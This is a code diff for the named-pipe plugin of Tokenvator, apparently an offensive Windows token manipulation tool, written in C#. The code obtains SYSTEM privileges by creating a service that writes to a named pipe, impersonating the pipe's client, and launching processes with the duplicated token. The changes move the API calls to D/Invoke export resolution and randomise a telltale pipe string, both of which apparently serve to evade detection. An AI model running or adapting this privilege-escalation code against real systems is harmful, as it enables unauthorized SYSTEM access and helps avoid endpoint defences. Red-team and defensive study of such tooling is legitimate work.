@@ -1,10 +1,16 @@
 ﻿using System;
 using System.IO;
 using System.IO.Pipes;
+using System.Runtime.InteropServices;
+using System.Runtime.ExceptionServices;
+using System.Security;
 using System.Security.AccessControl;
 using System.Threading;
 
+using DInvoke.DynamicInvoke;
+
 using Tokenvator.Resources;
+using Tokenvator.Plugins.AccessTokens;
 using Tokenvator.Plugins.Execution;
 
 using MonkeyWorks.Unmanaged.Headers;
@@ -13,58 +19,86 @@ using MonkeyWorks.Unmanaged.Libraries;
 
 namespace Tokenvator.Plugins.NamedPipes
 {
-    class NamedPipes
+    using MonkeyWorks = MonkeyWorks.Unmanaged.Libraries.DInvoke;
+
+    class NamedPipes : IDisposable
     {
-        private static IntPtr hToken = IntPtr.Zero;
+        private readonly IntPtr hadvapi32;
         private const string BASE_DIRECTORY = @"\\.\pipe\";
         private static readonly AutoResetEvent waitHandle = new AutoResetEvent(false);
 
         private delegate bool Create(IntPtr phNewToken, string newProcess, string arguments);
 
+        private Winnt._TOKEN_TYPE tokenType;
+        private readonly AccessTokens.AccessTokens accessTokens;
+
         ////////////////////////////////////////////////////////////////////////////////
+        /// <summary>
+        /// Default Constructor
+        /// Converted to D/Invoke GetPebLdrModuleEntry
+        /// </summary>
         ////////////////////////////////////////////////////////////////////////////////
         internal NamedPipes()
         {
-            
+            hadvapi32 = Generic.GetPebLdrModuleEntry("advapi32.dll");
+            accessTokens = new AccessTokens.AccessTokens();
         }
 
         ////////////////////////////////////////////////////////////////////////////////
+        /// <summary>
         /// GetSystem function for when SeDebugPrivilege is not available
+        /// No Conversion Required
+        /// </summary>
         ////////////////////////////////////////////////////////////////////////////////
-        internal static void GetSystem()
+        internal bool GetSystem()
         {
-            if (!_GetSystem())
-                return;
+            tokenType = Winnt._TOKEN_TYPE.TokenImpersonation;
 
-            if (IntPtr.Zero != hToken)
+            if (!_GetSystem())
             {
-                advapi32.ImpersonateLoggedOnUser(hToken);
-                kernel32.CloseHandle(hToken);
-                Console.WriteLine("[+] Operating as {0}", System.Security.Principal.WindowsIdentity.GetCurrent().Name);
-                hToken = IntPtr.Zero;
+                return false;
             }
+
+            return accessTokens.ImpersonateUser();
         }
 
         ////////////////////////////////////////////////////////////////////////////////
+        /// <summary>
         /// GetSystem function for when SeDebugPrivilege is not available
+        /// No conversions required
+        /// </summary>
+        /// <param name="command"></param>
+        /// <param name="arguments"></param>
         ////////////////////////////////////////////////////////////////////////////////
-        internal static void GetSystem(string command, string arguments)
+        internal bool GetSystem(string command, string arguments)
         {
+            tokenType = Winnt._TOKEN_TYPE.TokenPrimary;
+
             if (!_GetSystem())
-                return;
+            {
+                return false;
+            }
 
             Create createProcess;
             if (0 == System.Diagnostics.Process.GetCurrentProcess().SessionId)
+            {
                 createProcess = CreateProcess.CreateProcessWithLogonW;
+            }
             else
+            {
                 createProcess = CreateProcess.CreateProcessWithTokenW;
-            createProcess(hToken, command, arguments);
+            }
+            return createProcess(accessTokens.GetWorkingToken(), command, arguments);
         }
 
         ////////////////////////////////////////////////////////////////////////////////
+        /// <summary>
         /// Internal GetSystem function where the magic happens
+        /// No conversions required
+        /// </summary>
+        /// <returns></returns>
         ////////////////////////////////////////////////////////////////////////////////
-        private static bool _GetSystem()
+        private bool _GetSystem()
         {
             string pipename = Misc.GenerateUuid(12);
 
@@ -77,7 +111,7 @@ namespace Tokenvator.Plugins.NamedPipes
                     Console.WriteLine("[-] Unable to connect to local service host");
                     return false;
                 }
-                if (!psExec.Create("%COMSPEC% /c echo tokenvator > " + BASE_DIRECTORY + pipename))
+                if (!psExec.Create("%COMSPEC% /c echo " + Misc.GenerateUuid(8) + " > " + BASE_DIRECTORY + pipename))
                     return false;
                 if (!psExec.Open())
                     return false;
@@ -94,8 +128,12 @@ namespace Tokenvator.Plugins.NamedPipes
         }
 
         ////////////////////////////////////////////////////////////////////////////////
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="pipeName"></param>
         ////////////////////////////////////////////////////////////////////////////////
-        public static void GetPipeToken(string pipeName)
+        public void GetPipeToken(string pipeName)
         {
             Console.WriteLine("[*] Creating Listener Thread");
             Thread thread = new Thread(() => _GetPipeToken(pipeName));
@@ -106,23 +144,12 @@ namespace Tokenvator.Plugins.NamedPipes
             thread.Join();
             Console.WriteLine("[*] Joined Thread");
 
-            if (IntPtr.Zero != hToken)
-            {
-                if (!advapi32.ImpersonateLoggedOnUser(hToken))
-                {
-                    Console.WriteLine("[-] Token Impersonation Failed");
-                    Misc.GetWin32Error("ImpersonateLoggedOnUser");
-                }
-
-                kernel32.CloseHandle(hToken);
-                Console.WriteLine("[+] Operating as {0}", System.Security.Principal.WindowsIdentity.GetCurrent().Name);
-                hToken = IntPtr.Zero;
-            }
+            accessTokens.ImpersonateUser();
         }
 
         ////////////////////////////////////////////////////////////////////////////////
         ////////////////////////////////////////////////////////////////////////////////
-        public static void GetPipeToken(string pipeName, string command, string arguments)
+        public void GetPipeToken(string pipeName, string command, string arguments)
         {
             Console.WriteLine("[*] Creating Listener Thread");
             Thread thread = new Thread(() => _GetPipeToken(pipeName));
@@ -133,88 +160,103 @@ namespace Tokenvator.Plugins.NamedPipes
             thread.Join();
             Console.WriteLine("[*] Joined Thread");
 
-            if (IntPtr.Zero != hToken)
+            Create createProcess;
+            if (0 == System.Diagnostics.Process.GetCurrentProcess().SessionId)
             {
-                Create createProcess;
-                if (0 == System.Diagnostics.Process.GetCurrentProcess().SessionId)
-                    createProcess = CreateProcess.CreateProcessWithLogonW;
-                else
-                    createProcess = CreateProcess.CreateProcessWithTokenW;
-                createProcess(hToken, command, arguments);
+                createProcess = CreateProcess.CreateProcessWithLogonW;
             }
+            else
+            {
+                createProcess = CreateProcess.CreateProcessWithTokenW;
+            }
+            createProcess(accessTokens.GetWorkingToken(), command, arguments);
         }
 
         ////////////////////////////////////////////////////////////////////////////////
         ////////////////////////////////////////////////////////////////////////////////
-        private static bool _GetPipeToken(string pipeName)
+        [SecurityCritical]
+        [HandleProcessCorruptedStateExceptions]
+        private bool _GetPipeToken(string pipeName)
         {
-            try
+            PipeSecurity pipeSecurity = new PipeSecurity();
+            pipeSecurity.AddAccessRule(new PipeAccessRule("Everyone", PipeAccessRights.ReadWrite, AccessControlType.Allow));
+            using (NamedPipeServerStream namedPipe = new NamedPipeServerStream(
+                pipeName, 
+                PipeDirection.InOut, 2, 
+                PipeTransmissionMode.Message, 
+                PipeOptions.None, 
+                128, 128, pipeSecurity
+            ))
             {
-                PipeSecurity pipeSecurity = new PipeSecurity();
-                pipeSecurity.AddAccessRule(new PipeAccessRule("Everyone", PipeAccessRights.ReadWrite, AccessControlType.Allow));
-                using (NamedPipeServerStream namedPipe = new NamedPipeServerStream(
-                    pipeName, 
-                    PipeDirection.InOut, 2, 
-                    PipeTransmissionMode.Message, 
-                    PipeOptions.None, 
-                    128, 128, pipeSecurity
-                ))
-                {
-                    Console.WriteLine("[+] Created Pipe {0}", BASE_DIRECTORY + pipeName);
-                    namedPipe.WaitForConnection();
-                    Console.WriteLine("[+] Connected to Pipe {0}", pipeName);
-                    using (var streamReader = new StreamReader(namedPipe))
+                Console.WriteLine("[+] Created Pipe {0}", BASE_DIRECTORY + pipeName);
+                waitHandle.Set();
+                namedPipe.WaitForConnection();
+                Console.WriteLine("[+] Connected to Pipe {0}", pipeName);
+                using (var streamReader = new StreamReader(namedPipe))
+                {       
+                    streamReader.ReadToEnd();
+
+                    ////////////////////////////////////////////////////////////////////////////////
+                    // advapi32.ImpersonateNamedPipeClient(namedPipe.SafePipeHandle.DangerousGetHandle())
+                    ////////////////////////////////////////////////////////////////////////////////
+                    IntPtr hImpersonateNamedPipeClient = Generic.GetExportAddress(hadvapi32, "ImpersonateNamedPipeClient");
+                    MonkeyWorks.advapi32.ImpersonateNamedPipeClient fImpersonateNamedPipeClient = (MonkeyWorks.advapi32.ImpersonateNamedPipeClient)Marshal.GetDelegateForFunctionPointer(hImpersonateNamedPipeClient, typeof(MonkeyWorks.advapi32.ImpersonateNamedPipeClient));
+
+                    bool retVal = false;
+                    try
                     {
-                        streamReader.ReadToEnd();
-                        if (!advapi32.ImpersonateNamedPipeClient(namedPipe.SafePipeHandle.DangerousGetHandle()))
-                        {
-                            Misc.GetWin32Error("ImpersonateNamedPipeClient");
-                            return false;
-                        }
-                        Console.WriteLine("[+] Impersonated Pipe {0}", pipeName);
+                        retVal = fImpersonateNamedPipeClient(namedPipe.SafePipeHandle.DangerousGetHandle());
                     }
-                }
-                
-                
-                if (!kernel32.OpenThreadToken(kernel32.GetCurrentThread(), Winnt.TOKEN_ALL_ACCESS, false, ref hToken))
-                {
-                    Misc.GetWin32Error("OpenThreadToken");
-                    return false;
-                }
-                Console.WriteLine("[+] Thread Token 0x{0}", hToken.ToString("X4"));
-
-                
-                IntPtr phNewToken = new IntPtr();
-                uint result = ntdll.NtDuplicateToken(hToken, Winnt.TOKEN_ALL_ACCESS, IntPtr.Zero, true, Winnt._TOKEN_TYPE.TokenPrimary, ref phNewToken);
-                if (IntPtr.Zero == phNewToken)
-                {
-                    result = ntdll.NtDuplicateToken(hToken, Winnt.TOKEN_ALL_ACCESS, IntPtr.Zero, true, Winnt._TOKEN_TYPE.TokenImpersonation, ref phNewToken);
-                    if (IntPtr.Zero == phNewToken)
+                    catch (Exception ex)
                     {
-                        Misc.GetNtError("NtDuplicateToken", result);
+                        Console.WriteLine("[-] ImpersonateNamedPipeClient Generated an Exception");
+                        Console.WriteLine("[-] {0}", ex.Message);
+                        return false;
+                            
+                    }
+
+                    if (!retVal)
+                    {
+                        Misc.GetWin32Error("ImpersonateNamedPipeClient");
                         return false;
                     }
+                        
+
+                    Console.WriteLine("[+] Impersonated Pipe {0}", pipeName);
                 }
+            }
 
 
-                if (IntPtr.Zero != phNewToken)
-                {
-                    hToken = phNewToken;
-                }
+            IntPtr hkernel32 = Generic.GetPebLdrModuleEntry("kernel32.dll");
+            IntPtr hGetCurrentThreadId = Generic.GetExportAddress(hkernel32, "GetCurrentThreadId");
+            MonkeyWorks.kernel32.GetCurrentThreadId fGetCurrentThreadId = (MonkeyWorks.kernel32.GetCurrentThreadId)Marshal.GetDelegateForFunctionPointer(hGetCurrentThreadId, typeof(MonkeyWorks.kernel32.GetCurrentThreadId));
+
+            uint threadId = 0;
+            try
+            {
+                threadId = fGetCurrentThreadId();                       
             }
             catch (Exception ex)
             {
+                Console.WriteLine("[-] GetCurrentThreadId Generated an Exception");
                 Console.WriteLine("[-] {0}", ex.Message);
                 return false;
             }
-            finally
+
+            if (!accessTokens.OpenThreadToken(threadId, Winnt.TOKEN_ALL_ACCESS))
             {
-                waitHandle.Set();   
+                return false;
             }
+
+            accessTokens.SetWorkingTokenToThreadToken();
+
             return true;
         }
 
         ////////////////////////////////////////////////////////////////////////////////
+        /// <summary>
+        /// 
+        /// </summary>
         ////////////////////////////////////////////////////////////////////////////////
         internal static void EnumeratePipes()
         {
@@ -223,6 +265,16 @@ namespace Tokenvator.Plugins.NamedPipes
             {
                 Console.WriteLine(pipe);
             }
+        }
+
+        ~NamedPipes()
+        {
+
+        }
+
+        public void Dispose()
+        {
+            accessTokens.Dispose();
         }
     }
 }
